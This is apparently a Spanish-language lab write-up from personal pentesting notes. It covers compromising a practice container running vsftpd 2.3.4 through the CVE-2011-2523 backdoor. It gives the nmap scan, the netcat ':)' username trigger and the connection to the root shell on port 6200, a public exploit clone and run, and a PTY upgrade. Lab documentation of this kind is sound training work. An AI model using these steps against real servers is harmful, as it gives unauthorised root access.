

### Fase de Reconocimiento y Descubrimiento (Enumeración)

#### Escaneo de Puertos (Nmap)

Realizamos un escaneo inicial de puertos en la máquina objetivo para identificar servicios activos:

![[Pasted image 20260618225121.png]]

```bash
nmap -sCV -p21,80 -oN targeted 172.17.0.2
```

**Servicios identificados:**

* **Puerto 21/TCP (FTP):** Servicio de transferencia de archivos corriendo `vsftpd 2.3.4`. Ver teoría en [FTP.md](<../../../Pentesting Notes/1_Enumeration/FTP.md>).
* **Puerto 80/TCP (HTTP):** Servidor web `Apache httpd 2.4.58 (Ubuntu)`. Ver teoría en [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>).

***

### Enumeración de Servicios y Vulnerabilidades

#### Análisis del Servicio FTP (vsftpd 2.3.4)

Inspeccionamos la versión del servicio FTP detectada (`vsftpd 2.3.4`). Esta versión específica es ampliamente conocida por contener una puerta trasera (*backdoor*) introducida en su código fuente oficial (identificada como **CVE-2011-2523**):

![[Pasted image 20260618225158.png]]

* **Mecanismo de la vulnerabilidad (CVE-2011-2523):** Si se envía un nombre de usuario que contiene la secuencia `:)` (por ejemplo `USER anonymous:)`), el demonio activa una señal interna que abre un socket en el puerto TCP `6200` ofreciendo una consola interactiva con privilegios de superusuario (`root`).

***

### Fase de Explotación / Intrusión

Podemos explotar la puerta trasera de dos maneras: de forma manual con `nc` o mediante un script de explotación en Python.

#### Opción 1: Explotación Manual (Netcat)

1. Nos conectamos al servicio FTP en el puerto 21 y enviamos el disparador (*trigger*) en el campo de usuario:

```bash
nc 172.17.0.2 21
```

```text
220 (vsFTPd 2.3.4)
USER hacker:)
331 Please specify the password.
PASS password
```

2. Una vez enviado el trigger, el servidor abre el puerto 6200 con una shell de root. Nos conectamos directamente con `nc`:

```bash
nc 172.17.0.2 6200
```

#### Opción 2: Script en Python

También podemos utilizar el script público en Python para automatizar el proceso:

```bash
git clone https://github.com/padsalatushal/CVE-2011-2523.git
cd CVE-2011-2523
python3 exploit.py 172.17.0.2
```

***

### Escalada de Privilegios

Al explotar la puerta trasera de `vsftpd 2.3.4`, el proceso se ejecuta directamente bajo el contexto del usuario `root` (`uid=0(root) gid=0(root)`), por lo que **obtenemos acceso con máximos privilegios de manera directa** sin requerir una fase de elevación adicional.

Para estabilizar y obtener una terminal TTY interactiva completa, ejecutamos:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Comprobamos la identidad en el sistema:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
whoami
# root
```

***

### Relaciones y Conceptos

* **Teoría:** [FTP.md](<../../../Pentesting Notes/1_Enumeration/FTP.md>), [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>)
* **Laboratorios Relacionados:** [ApiBase](../Facil/ApiBase.md) (Comparte análisis relacionado con servicios FTP)